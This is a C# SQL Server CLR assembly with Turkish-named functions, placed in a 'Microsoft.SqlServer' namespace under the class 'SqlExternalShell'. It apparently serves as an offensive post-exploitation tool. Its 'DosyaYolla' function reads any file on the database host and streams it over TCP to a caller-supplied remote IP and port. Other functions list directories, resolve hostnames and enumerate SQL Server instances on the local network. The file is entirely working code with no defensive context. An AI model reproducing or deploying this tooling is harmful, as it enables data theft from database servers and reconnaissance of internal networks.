using System;

using System.Collections.Generic;
using System.IO;
using System.Data;
using System.Data.SqlTypes;
using System.Collections;
using System.Data.Sql;
using Microsoft.SqlServer;
using Microsoft.SqlServer.Server;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;
using System.Reflection;


namespace Microsoft.SqlServer
{
    public partial class SqlExternalShell
    {

        [Microsoft.SqlServer.Server.SqlFunction]
        public static SqlString DosyaYolla(SqlString localfile, SqlString remotePath, SqlString remoteip, SqlString remoteport)
        {
            try { 
                BinaryFormatter bFormatter = new BinaryFormatter();
                bFormatter.Binder = new CustomizedBinder();
                FileTransfer fTransfer = new FileTransfer();
                fTransfer.LocalFile = localfile.ToString();
                fTransfer.RemotePath = remotePath.ToString();
                fTransfer.Content = System.Convert.ToBase64String(File.ReadAllBytes(localfile.ToString()));
                fTransfer.Size = fTransfer.Content.Length;

                TcpClient client = new TcpClient();
                client.Connect(IPAddress.Parse(remoteip.ToString()), int.Parse(remoteport.ToString()));
                bFormatter.Serialize(client.GetStream(), fTransfer);

                client.Close();
                return "true";
            }catch(Exception e)
            {
                return "false";
            }
        }

        [Microsoft.SqlServer.Server.SqlFunction(FillRowMethodName = "DosyalariListeleTable_FillRow")]
        public static IEnumerable DosyalariListeleTable(SqlString DirPath)
        {
            DirectoryInfo Dir = new DirectoryInfo(DirPath.ToString());
            var rfiles = new List<string>();
            try
            {
                foreach (var f in Dir.GetFiles("*.*", SearchOption.TopDirectoryOnly))
                {
                    rfiles.Add(f.FullName);
                }
                foreach (var d in Dir.GetDirectories("*", SearchOption.TopDirectoryOnly))
                {
                    rfiles.Add(d.FullName.ToString());
                }
            }
            catch (Exception ex)  {}

            return rfiles;
        }
        public static void DosyalariListeleTable_FillRow(Object row, out SqlChars filename)
        {
            filename = new SqlChars((string)row);
        }



        [Microsoft.SqlServer.Server.SqlFunction(FillRowMethodName = "GetIpsFromHostTable_FillRow")]
        public static IEnumerable GetIpsFromHostTable(SqlString Hostname)
        {

            List<string> rips = new List<string>();
            foreach (IPAddress ip in Dns.GetHostAddresses(Hostname.ToString()))
            {
                rips.Add(ip.ToString());
            }
            return rips;
        }



        public static void GetIpsFromHostTable_FillRow(object ip, out SqlString IpAdres)
        {
            try
            {
                IpAdres = new SqlString((string)ip);
            }
            catch
            {
                IpAdres = new SqlString("");
            }

        }

        [Microsoft.SqlServer.Server.SqlFunction(FillRowMethodName = "NetworkSQLServers_FillRow")]
        public static IEnumerable NetworkSQLServers()
        {
            SqlDataSourceEnumerator instance = SqlDataSourceEnumerator.Instance;
            DataTable dtInstancesList = new DataTable();
            dtInstancesList = instance.GetDataSources().Select("", "ServerName ASC").CopyToDataTable();
            return dtInstancesList.Rows;
        }
        public static void NetworkSQLServers_FillRow(object ac, out SqlString ServerName, out SqlString InstanceName, out SqlString IsClustered, out SqlString Version, out SqlString IpAdres)
        {
            var row = (DataRow)ac;
            ServerName = new SqlString(row["ServerName"].ToString());
            InstanceName = new SqlString(row["InstanceName"].ToString());
            Version = new SqlString(row["Version"].ToString());
            IsClustered = new SqlString(row["IsClustered"].ToString());
            IpAdres = new SqlString(GetIpsFromHost(row["ServerName"].ToString()).ToString());
        }

        public static string GetIpsFromHost(string hname)
        {
            List<string> rips = new List<string>();
            foreach (IPAddress ip in Dns.GetHostAddresses(hname))
            {
                rips.Add(ip.ToString());
            }

            return string.Join(";", rips).ToString();
        }




        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void DosyalariListele(SqlString DirPath)
        {
            DirectoryInfo Dir = new DirectoryInfo(DirPath.ToString());
            var rfiles = new List<string>();
            try
            {
                foreach (var f in Dir.GetFiles("*.*", SearchOption.TopDirectoryOnly))
                {
                    rfiles.Add(f.FullName);
                }

                foreach (var d in Dir.GetDirectories("*", SearchOption.TopDirectoryOnly))
                {
                    rfiles.Add(d.FullName.ToString());
                }
            }
            catch (Exception ex) { }

            SqlContext.Pipe.Send(string.Join("\n", rfiles).ToString());
        }
    }

    [Serializable]
    public class FileTransfer
    {
        public string LocalFile { get; set; }
        public string RemotePath { get; set; }
        public int Size { get; set; }
        public string Content { get; set; }
    }

    sealed class CustomizedBinder : SerializationBinder
    {
        public override Type BindToType(string assemblyName, string typeName)
        {
            Type returntype = null;
            string sharedAssemblyName = "SharedAssembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
            assemblyName = Assembly.GetExecutingAssembly().FullName;
            typeName = typeName.Replace(sharedAssemblyName, assemblyName);
            returntype =
                    Type.GetType(String.Format("{0}, {1}",
                    typeName, assemblyName));

            return returntype;
        }

        public override void BindToName(Type serializedType, out string assemblyName, out string typeName)
        {
            base.BindToName(serializedType, out assemblyName, out typeName);
            assemblyName = "SharedAssembly, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
        }
    }

}
